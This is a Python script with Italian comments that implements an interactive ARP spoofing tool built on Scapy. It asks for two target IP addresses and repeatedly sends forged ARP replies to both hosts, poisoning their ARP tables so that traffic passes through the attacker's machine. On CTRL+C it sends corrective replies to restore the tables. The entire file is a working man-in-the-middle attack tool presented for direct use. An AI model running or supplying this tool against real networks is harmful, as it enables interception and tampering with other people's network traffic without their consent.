import scapy.all as scapy  # Importa la libreria Scapy per manipolare pacchetti di rete.
import time  # Per gestire i ritardi tra i pacchetti.
import logging  # Per disabilitare avvisi non necessari di Scapy.
import signal  # Per catturare i segnali di sistema (es. CTRL+C).
import sys  # Per eseguire operazioni di sistema, come l'uscita dal programma.

# Disabilita avvisi di Scapy durante l'esecuzione.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def spoof(target_host, spoof_host):
    """
    Invia pacchetti ARP falsificati (spoofing) a un target.
    target_host: Indirizzo IP della vittima.
    spoof_host: Indirizzo IP che si vuole impersonare.
    """
    # Ottieni l'indirizzo MAC del target.
    target_mac = get_mac(target_host)
    if target_mac is None:
        print(f"[!] Could not resolve MAC address for {target_host}. Skipping.")
        return
    
    # Crea un pacchetto ARP falsificato.
    packet = scapy.ARP(op=2, pdst=target_host, hwdst=target_mac, psrc=spoof_host)
    
    # Invia il pacchetto ARP senza output verbose.
    scapy.send(packet, verbose=False)

def get_mac(ip):
    """
    Ottiene l'indirizzo MAC di un dispositivo dato il suo IP.
    ip: Indirizzo IP del dispositivo.
    Ritorna: Indirizzo MAC del dispositivo o None se non risponde.
    """
    # Crea una richiesta ARP per l'indirizzo IP specificato.
    arp_request = scapy.ARP(pdst=ip)
    
    # Crea un pacchetto Ethernet per inviare la richiesta ARP a tutti i dispositivi (broadcast).
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Invia il pacchetto e riceve le risposte (timeout di 1 secondo).
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        # Ritorna l'indirizzo MAC del primo dispositivo che ha risposto.
        return answered_list[0][1].hwsrc
    else:
        # Nessuna risposta dal dispositivo specificato.
        print(f"[!] No response from {ip}")
        return None

def clean_target_arp_table(destination_host, source_host):
    """
    Ripristina le tabelle ARP dei dispositivi coinvolti.
    destination_host: IP del dispositivo target.
    source_host: IP del dispositivo "spoofato".
    """
    # Ottieni gli indirizzi MAC reali dei dispositivi.
    destination_mac = get_mac(destination_host)
    source_mac = get_mac(source_host)

    if destination_mac is None or source_mac is None:
        # Se non riesce a ottenere gli indirizzi MAC, avvisa l'utente.
        print("[!] Failed to restore ARP table.")
        return

    # Crea un pacchetto ARP "corretto" per ripristinare le tabelle ARP originali.
    packet = scapy.ARP(op=2, pdst=destination_host, hwdst=destination_mac, 
                       psrc=source_host, hwsrc=source_mac)
    
    # Invia più volte il pacchetto per assicurarsi che venga ricevuto.
    scapy.send(packet, count=5, verbose=False)

def run():
    """
    Funzione principale per eseguire lo spoofing ARP e gestire l'interruzione con CTRL+C.
    """
    print("\n[+] ARP Spoofing Tool")

    # Chiedi all'utente gli indirizzi IP dei due target.
    target1_host = input("Inserisci l'IP del primo target: ")
    target2_host = input("Inserisci l'IP del secondo target: ")

    packet_counter = 0  # Conta i pacchetti inviati.
    spoofing_active = True  # Variabile di stato per mantenere il ciclo attivo.

    # Funzione per interrompere lo spoofing quando viene premuto CTRL+C.
    def stop_spoofing(signal, frame):
        nonlocal spoofing_active  # Modifica la variabile spoofing_active all'interno della funzione.
        spoofing_active = False  # Ferma il ciclo.
        print("\n[+] Interruzione rilevata! Ripristino delle tabelle ARP...")

        # Ripristina le tabelle ARP dei due dispositivi.
        clean_target_arp_table(target1_host, target2_host)
        clean_target_arp_table(target2_host, target1_host)
        print("[+] Tabelle ARP ripristinate. Tornando al menu principale.")
        sys.exit(0)  # Termina il programma.

    # Registra la funzione per gestire il segnale CTRL+C.
    signal.signal(signal.SIGINT, stop_spoofing)

    print("[+] ARP Spoofing in corso... Premi CTRL+C per terminare.")
    while spoofing_active:
        # Invia pacchetti spoofati tra i due target.
        spoof(target1_host, target2_host)
        spoof(target2_host, target1_host)

        # Mostra il numero di pacchetti inviati.
        print(f"\rSpoofing packets sent: {packet_counter}", end="", flush=True)
        packet_counter += 2

        # Aspetta 1 secondo prima di inviare altri pacchetti.
        time.sleep(1)

    # Se il ciclo termina in modo naturale, ripristina le tabelle ARP.
    print("\n[+] Ripristino delle tabelle ARP...")
    clean_target_arp_table(target1_host, target2_host)
    clean_target_arp_table(target2_host, target1_host)
    print("[+] Tabelle ARP ripristinate. Tornando al menu principale.")

# Punto di ingresso del programma.
if __name__ == "__main__":
    run()
